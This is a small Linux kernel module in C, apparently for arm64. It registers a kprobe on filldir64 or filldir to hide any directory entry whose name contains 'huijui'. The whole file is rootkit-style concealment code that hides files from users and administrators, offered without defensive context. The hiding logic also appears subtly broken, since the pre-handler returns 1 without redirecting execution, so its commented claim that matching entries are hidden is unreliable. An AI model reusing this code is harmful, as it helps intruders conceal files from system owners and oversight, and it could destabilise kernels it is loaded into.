#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/version.h>

#define TAG "HuiJuiHide: "
static struct kprobe kp_filldir;

static int handler_pre_filldir(struct kprobe *p, struct pt_regs *regs) {
    const char *name = (const char *)regs->regs[1]; // arm64 上通常是 x1
    if (name && strstr(name, "huijui")) {
        return 1; // 找到并隐藏
    }
    return 0;
}

static int __init huijui_hide_init(void) {
    kp_filldir.symbol_name = "filldir64";
    kp_filldir.pre_handler = handler_pre_filldir;
    int ret = register_kprobe(&kp_filldir);
    if (ret < 0) {
        kp_filldir.symbol_name = "filldir";
        ret = register_kprobe(&kp_filldir);
    }
    pr_info(TAG "hide module loaded\n");
    return ret;
}

static void __exit huijui_hide_exit(void) {
    unregister_kprobe(&kp_filldir);
}

module_init(huijui_hide_init);
module_exit(huijui_hide_exit);
MODULE_LICENSE("GPL");
